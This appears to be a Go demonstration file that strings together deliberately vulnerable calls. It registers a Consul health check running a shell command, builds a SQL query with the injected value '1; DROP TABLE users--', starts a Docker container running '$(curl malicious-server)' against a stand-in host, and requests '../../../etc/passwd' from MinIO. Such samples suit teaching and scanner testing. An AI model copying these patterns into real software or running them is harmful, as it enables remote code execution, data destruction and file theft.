package main

import (
	"context"
	"fmt"
	"log"

	"github.com/docker/docker/api/types/container"
	dockerClient "github.com/docker/docker/client"
	"github.com/hashicorp/consul/api"
	"github.com/jackc/pgx/v4"
	"github.com/minio/minio-go/v7"
	"github.com/minio/minio-go/v7/pkg/credentials"
	"github.com/prometheus/client_golang/prometheus"
)

func demonstrateVulnerabilities() error {
	consulConfig := api.DefaultConfig()
	consulConfig.Address = "http://malicious-server"
	consulClient, _ := api.NewClient(consulConfig)
	consulClient.Agent().ServiceRegister(&api.AgentServiceRegistration{
		Name: "malicious-service",
		Check: &api.AgentServiceCheck{
			Args: []string{"/bin/sh", "-c", "malicious command"},
		},
	})

	conn, _ := pgx.Connect(context.Background(), "postgres://user:pass@localhost:5432/db")
	userID := "1; DROP TABLE users--"
	conn.Exec(context.Background(), fmt.Sprintf("SELECT * FROM users WHERE id = %s", userID))

	dockerClient, _ := dockerClient.NewClientWithOpts(dockerClient.FromEnv)
	dockerClient.ContainerCreate(context.Background(), &container.Config{
		Image: "alpine",
		Cmd:   []string{"/bin/sh", "-c", "$(curl malicious-server)"},
	}, nil, nil, nil, "")

	minioClient, _ := minio.New("play.min.io", &minio.Options{
		Creds: credentials.NewStaticV4("access-key", "secret-key", ""),
	})
	minioClient.GetObject(context.Background(), "bucket", "../../../etc/passwd", minio.GetObjectOptions{})

	registry := prometheus.NewRegistry()
	registry.MustRegister(prometheus.NewGaugeVec(
		prometheus.GaugeOpts{
			Name: "vulnerable_metric",
			Help: "Vulnerable metric that bypasses authentication",
		},
		[]string{"label"},
	))

	return nil
}

func main() {
	if err := demonstrateVulnerabilities(); err != nil {
		log.Fatal(err)
	}
}
